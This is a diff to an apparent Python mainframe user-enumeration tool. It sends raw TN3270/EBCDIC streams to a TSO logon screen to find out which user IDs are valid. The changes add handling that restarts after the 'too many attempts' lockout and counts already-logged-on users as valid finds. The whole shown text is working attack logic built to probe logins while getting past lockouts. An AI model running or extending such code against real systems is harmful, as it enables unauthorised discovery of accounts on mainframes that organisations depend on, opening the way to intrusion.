@@ -391,7 +391,7 @@ while(1):
 	if re.match("\xF3\x00\x06\x40\x00\xF1\xC2\x00\x05\x01\xFF\xFF\x02\xFF\xEF$",buffer):
 		MFsock.send("\x88\x00\x16\x81\x86\x00\x08\x00\xf4\xf1\xf1\xf2\xf2\xf3\xf3\xf4\xf4\xf5\xf5\xf6\xf6\xf7\xf7\x00\x0d\x81\x87\x04\x00\xf0\xf1\xf1\xf2\xf2\xf4\xf4\x00\x22\x81\x85\x82\x00\x07\x10\x00\x00\x00\x00\x07\x00\x00\x00\x00\x65\x00\x25\x00\x00\x00\x02\xb9\x00\x25\x01\x00\xf1\x03\xc3\x01\x36\x00\x2e\x81\x81\x03\x00\x00\x50\x00\x18\x00\x00\x01\x00\x48\x00\x01\x00\x48\x07\x10\x00\x00\x00\x00\x00\x00\x13\x02\x00\x01\x00\x50\x00\x18\x00\x00\x01\x00\x48\x00\x01\x00\x48\x07\x10\x00\x1c\x81\xa6\x00\x00\x0b\x01\x00\x00\x50\x00\x18\x00\x50\x00\x18\x0b\x02\x00\x00\x07\x00\x10\x00\x07\x00\x10\x00\x07\x81\x88\x00\x01\x02\x00\x16\x81\x80\x80\x81\x84\x85\x86\x87\x88\xa1\xa6\xa8\x96\x99\xb0\xb1\xb2\xb3\xb4\xb6\x00\x08\x81\x84\x00\x0a\x00\x04\x00\x06\x81\x99\x00\x00\xff\xef") #Whoa! Look it up. 
 	if re.match("\xF1\xC2\xFF\xEF$",buffer) or re.search("\xF1\xC2\x11\x40\x40\x1D\xC8\xC9\xD2\xD1\xF5\xF6\xF7\xF0\xF0",buffer): 
-		if results.verbose: print bcolors.YELLOW+"    [!]Sending bad userid", fake_tso_user
+		if results.verbose: print bcolors.YELLOW+"    [!]Sending bad userid", results.tso_fake
 		MFsock.send("\x7d\xc1\xd5\x11\x40\x5a"+AsciiToEbcdic(results.tso_fake)+"\xff\xef")
 	if re.search("\xC8"+AsciiToEbcdic(results.tso_fake.upper()),buffer): #c8 + userid = bad :)
 			if results.verbose: print bcolors.YELLOW+"    [!]At TSO: "+bcolors.GREEN+"!!!!!Start Enumeratin'!!!!!"
@@ -426,7 +426,7 @@ while(1):
         	        	pass
 
 
-		if re.search("LOGON REJECTED, TOO MANY ATTEMPTS",ascii_out):
+		if re.search("LOGON REJECTED, TOO MANY ATTEMPTS",ascii_out): #some systems boot you after too many attempts. Lets catch that and then continue
 			if results.verbose: print bcolors.YELLOW+"\n    [!]LOGON REJECTED, TOO MANY ATTEMPTS: Restarting"
 			at_screen = True
 			enumeratin = False
@@ -434,6 +434,18 @@ while(1):
 			encoded = AsciiToEbcdic(user)+pouring_one_out*(7-len(user))
 			MFsock.send("\x7d\xc9\xc3\x11\xc6\xe3"+encoded+"\xff\xef")
 			time.sleep(results.sleep)
+			if not results.verbose: print "\t - Pop! Pop!" #Magnitude!
+		elif re.search("UserId "+user.upper()+" already logged",ascii_out): #if a user is logged in this error will show. Catch it and display the result
+			if results.quiet: print bcolors.GREEN+"\t - User FOUND! -"+bcolors.RED+" User is logged in!"
+			else: print bcolors.YELLOW+"    [+]Valid User Found:"+bcolors.GREEN+"",user.upper(),"-"+bcolors.RED+" User is logged in!"
+			valid_users.append(user)			
+			#now to logon again with a different user
+			user = usernames.get()
+			if results.quiet: print bcolors.YELLOW+"    [!]Trying"+bcolors.RED+"",user,
+			encoded = AsciiToEbcdic(user)+pouring_one_out*(7-len(user))
+			MFsock.send("\x7d\xc2\xe5\x11\xc1\xf2\x93\x96\x87\x96\x95\xff\xef") #send 'logon'
+			time.sleep(1) #sleep to make sure we get what we need
+			MFsock.send("\x7d\xc5\xc5\x11\xc4\x4a"+encoded+"\xff\xef")
 		elif re.search("\xC8"+AsciiToEbcdic(user.upper()),buffer):
 			if results.quiet: print bcolors.BLUE+"\t - Not a User"
 			user = usernames.get()
